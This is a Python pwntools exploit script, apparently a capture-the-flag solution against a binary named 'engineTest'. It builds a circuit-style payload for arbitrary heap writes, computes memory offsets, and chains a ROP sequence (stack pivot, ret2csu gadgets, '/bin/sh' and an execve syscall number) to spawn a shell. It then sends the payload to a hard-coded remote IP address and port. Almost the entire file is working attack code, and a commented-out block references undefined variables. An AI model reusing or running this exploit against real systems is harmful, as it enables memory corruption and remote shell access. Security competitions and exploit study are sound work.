#!/usr/bin/python -i

from pwn import *

LOCAL = False#True

if LOCAL:
    lucky_number = 0x7e  # local
    __environ_address = 0x3c5f38
else:
    lucky_number = 0x9e  # remote
    __environ_address = 0x3a7fb8

AND_GATE = 1
OR_GATE = 2
XOR_GATE = 3
CHO_GATE = 4

f23_write_halflen = 16384#65536
circuit_length = 3072  #2048

heap_arbiwrite = []#[(0x40, 'greetings')]

heap_circuit_map_offset = (0xa1bc50 - 0xa03c40) * 8
heap_heapaddr_offset = (0x1239c60 - 0xa03c40) * 8
heap_libcaddr_offset = (0x1239c70 - 0xa03c40) * 8
heap_stackaddr_offset = (0x1239c88 - 0xa03c40) * 8


dif1_offset = 0x40
dif2_offset = 0x80
dif3_offset = 0xc0
dif4_offset = 0x100
cf = 0x10

stage2 = 550

injector = heap_circuit_map_offset + 320 * stage2 + 64 * 4  # XXX 33?

gates = []

real_gates = []


def assign(a, b):
    gates = []
    gates.append((AND_GATE, 1, b, 0, a))
    return gates


def one_bit_sub(a, b, cin, c, cout):
    gates = []
    gates.append((XOR_GATE, a, 1, 0, cout))
    gates.append((OR_GATE, cout, b, 0, c))
    gates.append((AND_GATE, c, cin, 0, c))
    gates.append((AND_GATE, cout, b, 0, cout))
    gates.append((OR_GATE, c, cout, 0, cout))
    gates.append((XOR_GATE, a, b, 0, c))
    gates.append((XOR_GATE, c, cin, 0, c))
    return gates


def one_bit_add(a, b, cin, c, cout):
    gates = []
    gates.append((OR_GATE, a, b, 0, c))
    gates.append((AND_GATE, c, cin, 0, c))
    gates.append((AND_GATE, a, b, 0, cout))
    gates.append((OR_GATE, c, cout, 0, cout))
    gates.append((XOR_GATE, a, b, 0, c))
    gates.append((XOR_GATE, c, cin, 0, c))
    return gates


for i in range(4, 40):
    real_gates += one_bit_sub(heap_stackaddr_offset + i,
                              heap_heapaddr_offset + i, cf, dif1_offset + i,
                              cf + 1)
    real_gates += assign(cf, cf + 1)

real_gates.append((AND_GATE, 1, 2, 1, 2))
"""
#disp = 0x20993c0
disp = 0x23a63c0#-(0xc5000-0xa7000)  # the suffix is correct, only the base will be adjusted since there are too many libs

disp += __environ_address

real_gates += assign(cf, 0)

for i in range(3, 40):
    real_gates += one_bit_add(dif1_offset + i, (disp >> i) & 1, cf,
                              dif2_offset + i, cf + 1)
    real_gates += assign(cf, cf + 1)

real_gates.append((AND_GATE, 1, 2, 2, 2))

for i in range(40):
    for j in range(3, 40):
        real_gates += assign(stack_warrior + i * 320 + 3 + j, dif2_offset + j)

real_gates.append((AND_GATE, 1, 2, 3, 2))
print len(real_gates)
assert len(real_gates) == stage1

for i in range(40):
    real_gates += assign(dif3_offset + i, (0x7f0000000000 << 3) + i)
real_gates.append((AND_GATE, 1, 2, 4, 2))


for i in range(40):
    real_gates += one_bit_sub(dif3_offset + i, heap_heapaddr_offset + i, cf,
                              dif4_offset + i, cf + 1)
    real_gates += assign(cf, cf + 1)

real_gates.append((AND_GATE, 1, 2, 5, 2))
"""

disp2 = 0x836194

real_gates += assign(cf, 0)

for i in range(3, 40):
    real_gates += one_bit_add(dif1_offset + i, (disp2 >> i) & 1, cf,
                              injector + i + 3, cf + 1)
    real_gates += assign(cf, cf + 1)

real_gates.append((AND_GATE, 1, 2, 6, 2))
print len(real_gates)
assert len(real_gates) == stage2
real_gates += assign(0x7f0000000004 << 3, 1)

real_gates.append((AND_GATE, 1, 2, 7, 2))

print len(real_gates)

gates_str = ''

stop_at = len(real_gates)

for i in range(stop_at):  #(len(real_gates)):
    for j in [1, 2, 3, 4]:
        k = real_gates[i][j]
        if j != 3 or k != 0:
            #if k > circuit_length * 256 or k < 0:
            heap_arbiwrite.append(
                (heap_circuit_map_offset / 8 + i * 40 + j * 8, p64(k)))

cf_raw = ''
if_raw = ''
of_raw = ''
flag_raw = '\x00' * f23_write_halflen + '\xff' * f23_write_halflen

if_raw += p64(f23_write_halflen * 2 * 8)

heap_atomic_arbiwrite_0 = []
heap_atomic_arbiwrite_1 = []

for tup in heap_arbiwrite:
    addr = tup[0]
    data = tup[1]
    l = len(data)
    for i in range(l):
        c = ord(data[i])
        binary = bin(c)[2:]
        binary = ('0' * 8 + binary)[-8:]
        binary = binary[::-1]
        for j in range(8):
            micro_addr = (addr + i) * 8 + j
            if binary[j] == '1':
                heap_atomic_arbiwrite_1.append(micro_addr)
            elif j == 1:  #if micro_addr >= perm_base - 0x1000:
                heap_atomic_arbiwrite_0.append(micro_addr)
                pass

print len(heap_atomic_arbiwrite_0)
print len(heap_atomic_arbiwrite_1)

assert (len(heap_atomic_arbiwrite_0) <= f23_write_halflen)
assert (len(heap_atomic_arbiwrite_1) <= f23_write_halflen)

for i in range(f23_write_halflen * 8):
    if i >= len(heap_atomic_arbiwrite_0):
        if_raw += p64(0)
    else:
        if_raw += p64(heap_atomic_arbiwrite_0[i] % (2**64))

for i in range(f23_write_halflen * 8):
    if i >= len(heap_atomic_arbiwrite_1):
        if_raw += p64(1)
    else:
        if_raw += p64(heap_atomic_arbiwrite_1[i] % (2**64))

assert (len(gates) <= circuit_length)

cf_raw += p64(circuit_length * 256)
cf_raw += p64(circuit_length)

for l in range(circuit_length):
    if l >= len(real_gates):
        cur_gate = (AND_GATE, 0, 0, 0, l + 1024)
    else:
        cur_gate = (real_gates[l][0], 0, 0, 0, 2)
    for ii in range(len(cur_gate)):
        i = cur_gate[ii]
        if i >= circuit_length * 256 or (ii == 4 and i <= 1):
            i = 2
        cf_raw += p64(i)

of_raw += p64(64 * 6)
for i in range(64 * 6):
    of_raw += p64(i)

rop = 'Hello world hello world!!!'

rop = ''

pop_rdi = 0x403c33
pop_rsp_2 = 0x402846
gets = 0x400cc0
new_stack_top = 0x605400
read_got = 0x605050

csu_1 = 0x403c2a
csu_2 = 0x403c10

rop += p64(pop_rdi)
rop += p64(new_stack_top - 0x20)
rop += p64(gets)
rop += p64(pop_rsp_2)
rop += p64(new_stack_top - 0x10)

rop2 = ''

rop2 += '/bin/sh\0'
rop2 += p64(new_stack_top - 0x20)
rop2 += p64(0)
rop2 += p64(0xdeadbeefdead)

# rdi=nst-0x20
# rsi=nst-0x18
# rdx=nst-0x10

rop2 += p64(csu_1)
rop2 += p64(0)  # rbx
rop2 += p64(1)  # rbp
rop2 += p64(read_got)  # r12
rop2 += p64(1)  # r13 = rdx
rop2 += p64(read_got)  # r14 = rsi
rop2 += p64(0)  # r15 = rdi
rop2 += p64(csu_2)
rop2 += p64(0xdeeddeadbeef)  # padding
rop2 += p64(0)  # rbx
rop2 += p64(1)  # rbp
rop2 += p64(read_got)  # r12
rop2 += p64(59)  # r13 = rdx
rop2 += p64(read_got)  # r14 = rsi
rop2 += p64(1)  # r15 = rdi
rop2 += p64(csu_2)
rop2 += p64(0xdeeddeadbeef)  # padding
rop2 += p64(0)  # rbx
rop2 += p64(1)  # rbp
rop2 += p64(read_got)  # r12
rop2 += p64(new_stack_top - 0x10)  # r13 = rdx
rop2 += p64(new_stack_top - 0x18)  # r14 = rsi
rop2 += p64(new_stack_top - 0x20)  # r15 = rdi
rop2 += p64(csu_2)

pl = cf_raw + if_raw + flag_raw + of_raw + cyclic(
    0xf8) + rop + '\n' + rop2 + '\n' + chr(lucky_number)

print 'payload ready, length:', len(pl)

if LOCAL:
    r = process(['./engineTest', 'none', 'none', 'none', 'none'])
    gdb.attach(r)
    raw_input('continue ->')
else:
    r = remote('202.120.7.199', 24680)

print 'prepare sending'

r.send(pl)

print 'send completed'

print hexdump(r.recvrepeat(2))
